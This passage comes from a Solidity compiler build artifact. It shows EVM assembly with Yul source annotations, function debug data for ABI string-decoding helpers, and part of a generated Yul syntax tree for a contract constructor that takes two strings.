   0x40\n        /* \"#utility.yul\":2208:2217   */\n      dup4\n        /* \"#utility.yul\":2199:2206   */\n      dup6\n        /* \"#utility.yul\":2195:2218   */\n      sub\n        /* \"#utility.yul\":2191:2223   */\n      slt\n        /* \"#utility.yul\":2188:2240   */\n      iszero\n      tag_162\n      jumpi\n        /* \"#utility.yul\":2236:2237   */\n      0x00\n        /* \"#utility.yul\":2233:2234   */\n      dup1\n        /* \"#utility.yul\":2226:2238   */\n      revert\n        /* \"#utility.yul\":2188:2240   */\n    tag_162:\n        /* \"#utility.yul\":2259:2288   */\n      tag_163\n        /* \"#utility.yul\":2278:2287   */\n      dup4\n        /* \"#utility.yul\":2259:2288   */\n      tag_140\n      jump\t// in\n    tag_163:\n        /* \"#utility.yul\":2249:2288   */\n      swap2\n      pop\n        /* \"#utility.yul\":2307:2345   */\n      tag_164\n        /* \"#utility.yul\":2341:2343   */\n      0x20\n        /* \"#utility.yul\":2330:2339   */\n      dup5\n        /* \"#utility.yul\":2326:2344   */\n      add\n        /* \"#utility.yul\":2307:2345   */\n      tag_140\n      jump\t// in\n    tag_164:\n        /* \"#utility.yul\":2297:2345   */\n      swap1\n      pop\n        /* \"#utility.yul\":2091:2351   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2356:2736   */\n    tag_65:\n        /* \"#utility.yul\":2435:2436   */\n      0x01\n        /* \"#utility.yul\":2431:2443   */\n      dup2\n      dup2\n      shr\n      swap1\n        /* \"#utility.yul\":2478:2490   */\n      dup3\n      and\n      dup1\n        /* \"#utility.yul\":2499:2560   */\n      tag_166\n      jumpi\n        /* \"#utility.yul\":2553:2557   */\n      0x7f\n        /* \"#utility.yul\":2545:2551   */\n      dup3\n        /* \"#utility.yul\":2541:2558   */\n      and\n        /* \"#utility.yul\":2531:2558   */\n      swap2\n      pop\n        /* \"#utility.yul\":2499:2560   */\n    tag_166:\n        /* \"#utility.yul\":2606:2608   */\n      0x20\n        /* \"#utility.yul\":2598:2604   */\n      dup3\n        /* \"#utility.yul\":2595:2609   */\n      lt\n        /* \"#utility.yul\":2575:2593   */\n      dup2\n        /* \"#utility.yul\":2572:2610   */\n      sub\n        /* \"#utility.yul\":2569:2730   */\n      tag_167\n      jumpi\n        /* \"#utility.yul\":2652:2662   */\n      0x4e487b71\n        /* \"#utility.yul\":2647:2650   */\n      0xe0\n        /* \"#utility.yul\":2643:2663   */\n      shl\n        /* \"#utility.yul\":2640:2641   */\n      0x00\n        /* \"#utility.yul\":2633:2664   */\n      mstore\n        /* \"#utility.yul\":2687:2691   */\n      0x22\n        /* \"#utility.yul\":2684:2685   */\n      0x04\n        /* \"#utility.yul\":2677:2692   */\n      mstore\n        /* \"#utility.yul\":2715:2719   */\n      0x24\n        /* \"#utility.yul\":2712:2713   */\n      0x00\n        /* \"#utility.yul\":2705:2720   */\n      revert\n        /* \"#utility.yul\":2569:2730   */\n    tag_167:\n      pop\n        /* \"#utility.yul\":2356:2736   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2741:2963   */\n    tag_88:\n        /* \"#utility.yul\":2806:2815   */\n      dup1\n      dup3\n      add\n        /* \"#utility.yul\":2827:2837   */\n      dup1\n      dup3\n      gt\n        /* \"#utility.yul\":2824:2957   */\n      iszero\n      tag_70\n      jumpi\n        /* \"#utility.yul\":2879:2889   */\n      0x4e487b71\n        /* \"#utility.yul\":2874:2877   */\n      0xe0\n        /* \"#utility.yul\":2870:2890   */\n      shl\n        /* \"#utility.yul\":2867:2868   */\n      0x00\n        /* \"#utility.yul\":2860:2891   */\n      mstore\n        /* \"#utility.yul\":2914:2918   */\n      0x11\n        /* \"#utility.yul\":2911:2912   */\n      0x04\n        /* \"#utility.yul\":2904:2919   */\n      mstore\n        /* \"#utility.yul\":2942:2946   */\n      0x24\n        /* \"#utility.yul\":2939:2940   */\n      0x00\n        /* \"#utility.yul\":2932:2947   */\n      revert\n\n    auxdata: 0xa2646970667358221220d4a03f46816d8abc72fd918a2322f2a3c568a20318b17dfd2264e68a262d9d2764736f6c63430008120033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_44": {
									"entryPoint": null,
									"id": 44,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_decode_string_fromMemory": {
									"entryPoint": 112,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_string_memory_ptrt_string_memory_ptr_fromMemory": {
									"entryPoint": 287,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 2
								},
								"array_dataslot_string_storage": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"clean_up_bytearray_end_slots_string_storage": {
									"entryPoint": 453,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 0
								},
								"copy_byte_array_to_storage_from_t_string_memory_ptr_to_t_string_storage": {
									"entryPoint": 536,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"extract_byte_array_length": {
									"entryPoint": 393,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"extract_used_part_and_set_length_of_short_byte_array": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"panic_error_0x41": {
									"entryPoint": 90,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:4144:5",
										"statements": [
											{
												"nodeType": "YulBlock",
												"src": "6:3:5",
												"statements": []
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "46:95:5",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "63:1:5",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"arguments": [
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "70:3:5",
																				"type": "",
																				"value": "224"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "75:10:5",
																				"type": "",
																				"value": "0x4e487b71"
																			}
																		],
																		"functionName": {
																			"name": "shl",
																			"nodeType": "YulIdentifier",
																			"src": "66:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "66:20:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "56:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "56:31:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "56:31:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "103:1:5",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "106:4:5",
																		"type": "",
																		"value": "0x41"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "96:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "96:15:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "96:15:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "127:1:5",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "130:4:5",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "120:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "120:15:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "120:15:5"
														}
													]
												},
												"name": "panic_error_0x41",
												"nodeType": "YulFunctionDefinition",
												"src": "14:127:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "210:776:5",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "259:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "268:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "271:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "261:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "261:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "261:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "238:6:5"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "246:4:5",
																						"type": "",
																						"value": "0x1f"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "234:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "234:17:5"
																			},
																			{
																				"name": "end",
																				"nodeType": "YulIdentifier",
																				"src": "253:3:5"
																			}
																		],
																		"functionName": {
																			"name": "slt",
																			"nodeType": "YulIdentifier",
																			"src": "230:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "230:27:5"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "223:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "223:35:5"
															},
															"nodeType": "YulIf",
															"src": "220:55:5"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "284:23:5",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "300:6:5"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "294:5:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "294:13:5"
															},
															"variables": [
																{
																	"name": "_1",
																	"nodeType": "YulTypedName",
																	"src": "288:2:5",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "316:28:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "334:2:5",
																				"type": "",
																				"value": "64"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "338:1:5",
																				"type": "",
																				"value": "1"
																			}
																		],
																		"functionName": {
																			"name": "shl",
																			"nodeType": "YulIdentifier",
																			"src": "330:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "330:10:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "342:1:5",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "326:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "326:18:5"
															},
															"variables": [
																{
																	"name": "_2",
																	"nodeType": "YulTypedName",
																	"src": "320:2:5",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "367:22:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x41",
																				"nodeType": "YulIdentifier",
																				"src": "369:16:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "369:18:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "369:18:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "_1",
																		"nodeType": "YulIdentifier",
																		"src": "359:2:5"
																	},
																	{
																		"name": "_2",
																		"nodeType": "YulIdentifier",
																		"src": "363:2:5"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "356:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "356:10:5"
															},
															"nodeType": "YulIf",
															"src": "353:36:5"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "398:17:5",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "412:2:5",
																		"type": "",
																		"value": "31"
																	}
																],
																"functionName": {
																	"name": "not",
																	"nodeType": "YulIdentifier",
																	"src": "408:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "408:7:5"
															},
															"variables": [
																{
																	"name": "_3",
																	"nodeType": "YulTypedName",
																	"src": "402:2:5",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "424:23:5",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "444:2:5",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "438:5:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "438:9:5"
															},
															"variables": [
																{
																	"name": "memPtr",
																	"nodeType": "YulTypedName",
																	"src": "428:6:5",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "456:71:5",
															"value": {
																"arguments": [
																	{
																		"name": "memPtr",
																		"nodeType": "YulIdentifier",
																		"src": "478:6:5"
																	},
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "_1",
																										"nodeType": "YulIdentifier",
																										"src": "502:2:5"
																									},
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "506:4:5",
																										"type": "",
																										"value": "0x1f"
																									}
																								],
																								"functionName": {
																									"name": "add",
																									"nodeType": "YulIdentifier",
																									"src": "498:3:5"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "498:13:5"
																							},
																							{
																								"name": "_3",
																								"nodeType": "YulIdentifier",
																								"src": "513:2:5"
																							}
																						],
																						"functionName": {
																							"name": "and",
																							"nodeType": "YulIdentifier",
																							"src": "494:3:5"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "494:22:5"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "518:2:5",
																						"type": "",
																						"value": "63"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "490:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "490:31:5"
																			},
																			{
																				"name": "_3",
																				"nodeType": "YulIdentifier",
																				"src": "523:2:5"
																			}
																		],
																		"functionName": {
																			"name": "and",
																			"nodeType": "YulIdentifier",
																			"src": "486:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "486:40:5"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "474:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "474:53:5"
															},
															"variables": [
																{
																	"name": "newFreePtr",
																	"nodeType": "YulTypedName",
																	"src": "460:10:5",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "586:22:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x41",
																				"nodeType": "YulIdentifier",
																				"src": "588:16:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "588:18:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "588:18:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "newFreePtr",
																				"nodeType": "YulIdentifier",
																				"src": "545:10:5"
																			},
																			{
																				"name": "_2",
																				"nodeType": "YulIdentifier",
																				"src": "557:2:5"
																			}
																		],
																		"functionName": {
																			"name": "gt",
																			"nodeType": "YulIdentifier",
																			"src": "542:2:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "542:18:5"
																	},
																	{
																		"arguments": [
																			{
																				"name": "newFreePtr",
																				"nodeType": "YulIdentifier",
																				"src": "565:10:5"
																			},
																			{
																				"name": "memPtr",
																				"nodeType": "YulIdentifier",
																				"src": "577:6:5"
																			}
																		],
																		"functionName": {
																			"name": "lt",
																			"nodeType": "YulIdentifier",
																			"src": "562:2:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "562:22:5"
																	}
																],
																"functionName": {
																	"name": "or",
																	"nodeType": "YulIdentifier",
																	"src": "539:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "539:46:5"
															},
															"nodeType": "YulIf",
															"src": "536:72:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "624:2:5",
																		"type": "",
																		"value": "64"
																	},
																	{
																		"name": "newFreePtr",
																		"nodeType": "YulIdentifier",
																		"src": "628:10:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "617:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "617:22:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "617:22:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "memPtr",
																		"nodeType": "YulIdentifier",
																		"src": "655:6:5"
																	},
																	{
																		"name": "_1",
																		"nodeType": "YulIdentifier",
																		"src": "663:2:5"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "648:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "648:18:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "648:18:5"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "675:14:5",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "685:4:5",
																"type": "",
																"value": "0x20"
															},
															"variables": [
																{
																	"name": "_4",
																	"nodeType": "YulTypedName",
																	"src": "679:2:5",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "735:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "744:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "747:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "737:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "737:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "737:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "712:6:5"
																					},
																					{
																						"name": "_1",
																						"nodeType": "YulIdentifier",
																						"src": "720:2:5"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "708:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "708:15:5"
																			},
																			{
																				"name": "_4",
																				"nodeType": "YulIdentifier",
																				"src": "725:2:5"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "704:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "704:24:5"
																	},
																	{
																		"name": "end",
																		"nodeType": "YulIdentifier",
																		"src": "730:3:5"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "701:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "701:33:5"
															},
															"nodeType": "YulIf",
															"src": "698:53:5"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "760:10:5",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "769:1:5",
																"type": "",
																"value": "0"
															},
															"variables": [
																{
																	"name": "i",
																	"nodeType": "YulTypedName",
																	"src": "764:1:5",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "825:87:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"name": "memPtr",
																									"nodeType": "YulIdentifier",
																									"src": "854:6:5"
																								},
																								{
																									"name": "i",
																									"nodeType": "YulIdentifier",
																									"src": "862:1:5"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "850:3:5"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "850:14:5"
																						},
																						{
																							"name": "_4",
																							"nodeType": "YulIdentifier",
																							"src": "866:2:5"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "846:3:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "846:23:5"
																				},
																				{
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"arguments": [
																										{
																											"name": "offset",
																											"nodeType": "YulIdentifier",
																											"src": "885:6:5"
																										},
																										{
																											"name": "i",
																											"nodeType": "YulIdentifier",
																											"src": "893:1:5"
																										}
																									],
																									"functionName": {
																										"name": "add",
																										"nodeType": "YulIdentifier",
																										"src": "881:3:5"
																									},
																									"nodeType": "YulFunctionCall",
																									"src": "881:14:5"
																								},
																								{
																									"name": "_4",
																									"nodeType": "YulIdentifier",
																									"src": "897:2:5"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "877:3:5"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "877:23:5"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "871:5:5"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "871:30:5"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "839:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "839:63:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "839:63:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "790:1:5"
																	},
																	{
																		"name": "_1",
																		"nodeType": "YulIdentifier",
																		"src": "793:2:5"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "787:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "787:9:5"
															},
															"nodeType": "YulForLoop",
															"post": {
																"nodeType": "YulBlock",
																"src": "797:19:5",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "799:15:5",
																		"value": {
																			"arguments": [
																				{
																					"name": "i",
																					"nodeType": "YulIdentifier",
																					"src": "808:1:5"
																				},
																				{
																					"name": "_4",
																					"nodeType": "YulIdentifier",
																					"src": "811:2:5"
																				}
																			],
																			"functionName": {
																				"name": "add",
																				"nodeType": "YulIdentifier",
																				"src": "804:3:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "804:10:5"
																		},
																		"variableNames": [
																			{
																				"name": "i",
																				"nodeType": "YulIdentifier",
																				"src": "799:1:5"
																			}
																		]
																	}
																]
															},
															"pre": {
																"nodeType": "YulBlock",
																"src": "783:3:5",
																"statements": []
															},
															"src": "779:133:5"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "memPtr",
																						"nodeType": "YulIdentifier",
																						"src": "936:6:5"
																					},
																					{
																						"name": "_1",
																						"nodeType": "YulIdentifier",
																						"src": "944:2:5"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "932:3:5"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "932:15:5"
																			},
																			{
																				"name": "_4",
																				"nodeType": "YulIdentifier",
																				"src": "949:2:5"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "928:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "928:24:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "954:1:5",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "921:6:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "921:35:5"
															},
															"nodeType": "YulExpressionStatement",
															"src": "921:35:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "965:15:5",
															"value": {
																"name": "memPtr",
																"nodeType": "YulIdentifier",
																"src": "974:6:5"
															},
															"variableNames": [
																{
																	"name": "array",
																	"nodeType": "YulIdentifier",
																	"src": "965:5:5"
																}
															]
														}
													]
												},
												"name": "abi_decode_string_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "184:6:5",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "192:3:5",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "array",
														"nodeType": "YulTypedName",
														"src": "200:5:5",
														"type": ""
													}
												],
												"src": "146:840:5"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1109:444:5",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1155:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1164:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1167:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1157:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1157:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1157:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1130:7:5"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1139:9:5"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "1126:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1126:23:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1151:2:5",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "1122:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1122:32:5"
															},
															"nodeType": "YulIf",
															"src": "1119:52:5"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "1180:30:5",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1200:9:5"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "1194:5:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1194:16:5"
															},
															"variables": [
																{
																	"name": "offset",
																	"nodeType": "YulTypedName",
																	"src": "1184:6:5",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "1219:28:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1237:2:5",
																				"type": "",
																				"value": "64"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1241:1:5",
																				"type": "",
																				"value": "1"
																			}
																		],
																		"functionName": {
																			"name": "shl",
																			"nodeType": "YulIdentifier",
																			"src": "1233:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1233:10:5"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1245:1:5",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "1229:3:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1229:18:5"
															},
															"variables": [
																{
																	"name": "_1",
																	"nodeType": "YulTypedName",
																	"src": "1223:2:5",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1274:16:5",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1283:1:5",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1286:1:5",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1276:6:5"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1276:12:5"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1276:12:5"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "1262:6:5"
																	},
																	{
																		"name": "_1",
																		"nodeType": "YulIdentifier",
																		"src": "1270:2:5"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "1259:2:5"
																},
																"nodeType": "YulFunctionCall",
																"src": "1259:14:5"
															},
															"nodeType": "YulIf",
															"src": "1256:34:5"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1299:71:5",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1342:9:5"
																			},
																			{
																				"name": "offset",
																				"nodeType": "YulIdentifier",
																				"src": "1353:6:5"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1338:3:5"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1338:22:5"
																	},
																	{
																		"name": "dataEnd",
																		"nodeType": "YulIdentifier",
																		"src": "1362:7:5"
																	}
																],
																"functionName": {
